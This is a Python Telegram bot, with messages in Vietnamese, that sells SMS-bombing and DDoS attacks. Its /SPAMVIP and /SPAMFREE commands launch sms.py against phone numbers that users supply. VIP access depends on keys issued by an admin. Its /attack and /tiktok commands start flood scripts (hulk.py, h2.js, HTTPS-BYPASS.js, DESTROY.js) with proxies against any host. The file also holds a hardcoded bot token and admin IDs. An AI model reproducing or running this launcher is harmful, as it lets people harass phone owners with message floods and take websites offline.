import telebot
from datetime import datetime
import psutil
import time
import os,sys,re
import subprocess
import requests
import datetime
import subprocess
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
import subprocess 


bot_token = '7034738568:AAHsksPmCEQu61vUkMQ_vL1rHKx2WaWniZo' 
bot = telebot.TeleBot(bot_token)
allowed_group_id = -1002114690126

allowed_users = []
processes = []
ADMIN_ID = '7046149384'
ADMIN_ID2 = '6219604772'

def TimeStamp():
    now = str(datetime.date.today())
    return now


@bot.message_handler(commands=['SPAMVIP'])
def superspam(message):
    user_id = message.from_user.id
    if not os.path.exists(f"./vip/{user_id}.txt"):
      bot.reply_to(message, 'Bạn chưa đăng ký vip vui lòng liên hệ admin')
      return
    fo = open(f"./vip/{user_id}.txt")
    data = fo.read().split("|")
    qua_khu = data[0].split('-')
    qua_khu = datetime.date(int(qua_khu[0]), int(qua_khu[1]), int(qua_khu[2]))
    ngay_hien_tai = datetime.date.today()
    so_ngay = int((ngay_hien_tai - qua_khu).days)
    if so_ngay < 0:
            bot.reply_to(message, 'Chưa Đến Ngày Sử Dụng Gói VIP')
            return
    if so_ngay >= int(data[1]):
          bot.reply_to(message, 'Key Vip Hết Hạn Vui Lòng ib Admin ')
          os.remove(f"./vip/{user_id}.txt")
          return
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'VUI LÒNG NHẬP SỐ ĐIỆN THOẠI ')
        return
    if len(message.text.split()) == 2:
     bot.reply_to(message, 'Thiếu dữ kiện !!!')
     return
    lap = message.text.split()[2]
    if not lap.isnumeric():
     bot.reply_to(message,"Sai dữ kiện !!!")
     return
    phone_number = message.text.split()[1]
    if not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone_number):
     bot.reply_to(message, 'SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !')
     return
    if phone_number in ["0867216408"]:
     bot.reply_to(message,"Bạn Không Có Quyền Spam Số Này ???")
     return
    cpu_percent = psutil.cpu_percent()
    memory_percent = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, lap])
    processes.append(process)
    bot.reply_to(message, f"""
┏━━━━━━━━━━━━━━━━━━┓
      🖥  SMS  🖥 VIP PRO  🖥
┗━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━┓
┣➤ ᴀᴛᴛᴀᴄᴋ sᴜᴄᴄᴇssғᴜʟ
┣━━━━━━━━━━━━━━━━━━
┣➤ ʙᴏᴛ: @SMSFREE_bot
┣━━━━━━━━━━━━━━━━━━
┣➤ ᴜsᴇʀ: {message.from_user.full_name} 
┣━━━━━━━━━━━━━━━━━━
┣➤ ɴᴜᴍʙᴇʀ: {phone_number}
┣━━━━━━━━━━━━━━━━━━
┣➤ ʀᴇᴘᴇᴀᴛ: {lap} Lần 
┣━━━━━━━━━━━━━━━━━━
┣➤ ᴋᴇʏ: VIP
┣━━━━━━━━━━━━━━━━━━
┣➤ ᴄᴘᴜ: {cpu_percent}%
┣━━━━━━━━━━━━━━━━━━
┣➤ ʀᴀᴍ: {memory_percent}%
┣━━━━━━━━━━━━━━━━━━
┣➤ ᴅɪsᴋ: {disk_usage}%
┗━━━━━━━━━━━━━━━━━━┛""")
  
  
@bot.message_handler(commands=['SPAMFREE'])
def spam(message):
    if not is_bot_active:
       bot.reply_to(message, 'Bot Hiện Đã Tắt Spam Miễn Phí, Vui Long Ib Admin Để Spam Vip.')
       return          
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'VUI LÒNG NHẬP SỐ ĐIỆN THOẠI ')
        return
    if len(message.text.split()) == 2:
        bot.reply_to(message, 'Thiếu dữ kiện !!!')
        return
    lap = message.text.split()[2]
    if lap.isnumeric():
      if not (int(lap) > 0 and int(lap) <= 40):
        bot.reply_to(message,"Vui lòng spam trong khoảng 1-40. Nếu nhiều hơn ib admin để sài vip")
        return
    else:
      bot.reply_to(message,"Sai dữ kiện !!!")
      return
    phone_number = message.text.split()[1]
    if not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",phone_number):
        bot.reply_to(message, 'SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !')
        return

    if phone_number in ["0365956335"]:
        # Số điện thoại nằm trong danh sách cấm
        bot.reply_to(message,"Spam cái đầu buồi tao huhu")
        return

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, lap])
    processes.append(process)
    bot.reply_to(message, f"""
┏━━━━━━━━━━━━━━━━━━┓
      ✈ SMS ✈ MIỄN PHÍ ✈
┗━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━┓
┣➤ Tấn Công Thành Công
┣➤ Bot 👾: @SMSFREE_bot 
┣➤ Số Spam: {phone_number}
┣➤ Lặp Lại: {lap} Lần 
┣➤ Loại SPAM : Miễn Phí
┗━━━━━━━━━━━━━━━━━━┛""")




 
  #Huong Dẫn
@bot.message_handler(commands=['help'])
def help(message):
    if not is_bot_active:
       bot.reply_to(message, 'Bot Hiện Tại Đang Bị Tắt, Chưa Được Hoạt Động...!!!')
       return
    help_text = f"""⠀⠀⠀⠀⠀⠀⠀⠀⠀
▮SMS ✈
┏━━━━━━━━━━━━━━━━━━━━━┓
┣➤ /SPAMVIP + SDT + Lần
┣━━━━━━━━━━━━━━━━━━━━━
┣➤ /SPAMFREE + SDT + Lần
┗━━━━━━━━━━━━━━━━━━━━━┛
"""
    bot.reply_to(message, help_text)
cooldown_dict = {}
is_bot_active = True


def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Order Stopped. Thank You For Using.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please Enter Correct Syntax.\Example: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please Wait {remaining_time} Seconds Before Using the Command Again.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn", "ngocphong.com"]   
    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Attacking Websites with Domain Names is Not Allowed {blocked_domain}")
                return

    if method in ['HULK','TLS']:
        # Update the command and duration based on the selected method
        if method == 'HULK':
            command = ["python", "hulk.py", host]
            duration = 90
        if method == 'HTTPS-BYPASS':
            command = ["node", "HTTPS-BYPASS.js", host, "90", "90", "10", "GET", "proxy.txt"]
            duration = 90
        if method == 'TLS':
            command = ["node", "h2.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90
        if method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack SucessFully Sent \n • Attack By : @{username} \n • Host : {host} \n • Port : 443 \n • Methods : {method} \n • Time : {duration} Seconds')
    else:
        bot.reply_to(message, 'Invalid Attack Method.')
        
        
#View
        
@bot.message_handler(commands=['tiktok'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please Enter Correct Syntax.\Example: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please Wait {remaining_time} Seconds Before Using the Command Again.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn", "ngocphong.com"]   
    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Attacking Websites with Domain Names is Not Allowed {blocked_domain}")
                return

    if method in ['VIEW','TLS']:
        # Update the command and duration based on the selected method
        if method == 'VIEW':
            command = ["python", "view.py", host]
            duration = 90
        if method == 'HTTPS-BYPASS':
            command = ["node", "HTTPS-BYPASS.js", host, "90", "90", "10", "GET", "proxy.txt"]
            duration = 90
        if method == 'TLS':
            command = ["node", "h2.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90
        if method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack SucessFully Sent \n • Attack By : @{username} \n • Host : {host} \n • Port : 443 \n • Methods : {method} \n • Time : {duration} Seconds')
    else:
        bot.reply_to(message, 'Invalid Attack Method.')


# status
@bot.message_handler(commands=['status'])
def status(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return
    process_count = len(processes)
    bot.reply_to(message, f'Số quy trình đang chạy: {process_count}.')



# khoir dong lai bot
@bot.message_handler(commands=['reset'])
def restart(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return
    bot.reply_to(message, 'Bot sẽ được khởi động lại trong giây lát...')
    time.sleep(2)
    python = sys.executable
    os.execl(python, python, *sys.argv)


# stop chuongw trinhf
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return
    bot.reply_to(message, 'Bot sẽ dừng lại trong giây lát...')
    time.sleep(2)
    bot.stop_polling()

# Thêm Vip User

@bot.message_handler(commands=['them'])
def them(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return
    idvip = message.text.split(" ")[1]
    ngay = message.text.split(" ")[2]
    d1 = time.strftime('%d-%m-%Y', time.localtime())
    idu = message.from_user.full_name
    hethan = message.text.split(" ")[3]
    fii = open(f"./vip/{idvip}.txt","w")
    fii.write(f"{ngay}|{hethan}")
    bot.reply_to(message, f"""
┏━━━━━━━━━━━━━━━━━━┓
    THÊM VIP USER
┗━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━┓
┣➤ Đã Thêm ID: {idvip}
┣➤ Ngày Thêm: {d1}
┣➤ Hạn Sử Dụng: {hethan} Ngày
┣➤ Admin Add: {idu}
┣➤ Hạn Chế: Không Giới Hạn
┗━━━━━━━━━━━━━━━━━━┛""")

# Tắt Bot
    
@bot.message_handler(commands=['tat'])
def turn_off(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, f'➤ Bot Sẽ Tắt Sau Vài Giây , Tất Cả Lệnh Sẽ Không Hoạt Động')

# Mở Bot

@bot.message_handler(commands=['mo'])
def turn_on(message):
    user_id = message.from_user.id
    if str(user_id) != ADMIN_ID:
        bot.reply_to(message, '➤ Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, f'➤ Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True

# Kiểm Tra Người Dùng
@bot.message_handler(commands=['info'])
def info(message):
        data = message.from_user.id
        bot.reply_to(message, f"""
┏━━━━━━━━━━━━━━━━━━┓
    INFO USER ID
┗━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━┓
┣➤ Họ Và Tên: {message.from_user.full_name}
┣➤ User ID: {data}
┗━━━━━━━━━━━━━━━━━━┛""")
        


#ham time
        
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')

    
    
# lenh lo 
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')

bot.polling()
